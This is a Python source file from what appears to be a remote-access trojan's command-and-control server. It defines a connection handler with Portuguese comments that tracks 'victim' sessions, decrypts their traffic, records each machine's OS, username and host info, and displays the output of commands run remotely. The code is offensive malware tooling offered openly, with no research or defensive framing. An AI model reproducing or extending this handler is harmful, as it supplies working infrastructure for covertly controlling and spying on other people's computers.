import time
from datetime import datetime
import select

class ClientHandler:
    def __init__(self, server, socket, address, session_id):
        self.server = server
        self.socket = socket
        self.address = address
        self.session_id = session_id
    
    def handle_victim(self):
        self._handle_connection(is_victim=True)
    
    def handle_client(self):
        self._handle_connection(is_victim=False)
    
    def _handle_connection(self, is_victim=False):
        try:
            while self.server.running:
                # Receber dados do cliente
                data = self.server.receive_data(self.socket, 0.5)
                if data is None:
                    continue
                if not data:
                    break
                    
                # Adicionar ao buffer do cliente
                if self.session_id in self.server.clients:
                    self.server.clients[self.session_id]['buffer'] += data
                    self.server.clients[self.session_id]['last_seen'] = datetime.now()
                    self.server.clients[self.session_id]['last_active'] = datetime.now()
                    
                # Processar informações do cliente
                self._process_data(data)
                    
        except Exception as e:
            self.server.console.print(f"[red]✗ Erro na sessão {self.session_id}: {e}[/red]")
        finally:
            self.server.remove_client(self.session_id)
    
    def _process_data(self, data):
        try:
            # Tentar descriptografar se necessário
            try:
                decoded_data = data.decode('utf-8', errors='ignore')
                if self.server.encryption.key:
                    decoded_data = self.server.encryption.decrypt(decoded_data)
            except:
                decoded_data = data.decode('utf-8', errors='ignore')
            
            # Processar diferentes tipos de mensagens
            if decoded_data.startswith("INFO:"):
                info = decoded_data[5:]
                if self.session_id in self.server.clients:
                    self.server.clients[self.session_id]['info'] = info
                self.server.console.print(f"[cyan]ℹ️  Info da sessão {self.session_id}: {info}[/cyan]")
            
            elif decoded_data.startswith("OS:"):
                os_info = decoded_data[3:]
                if self.session_id in self.server.clients:
                    self.server.clients[self.session_id]['os'] = os_info
            
            elif decoded_data.startswith("USER:"):
                user_info = decoded_data[5:]
                if self.session_id in self.server.clients:
                    self.server.clients[self.session_id]['username'] = user_info
            
            # Se for resposta de comando, exibir
            elif decoded_data.startswith("RESULT:"):
                result = decoded_data[7:]
                self.server.console.print(f"[blue][Sessão {self.session_id}][/blue] [green]Resultado:[/green]\n{result}")
            
            # Heartbeat
            elif decoded_data == "PING":
                if self.session_id in self.server.clients:
                    self.server.send_data(self.session_id, "PONG")
            
        except Exception as e:
            self.server.console.print(f"[yellow]⚠️  Erro ao processar dados: {e}[/yellow]")
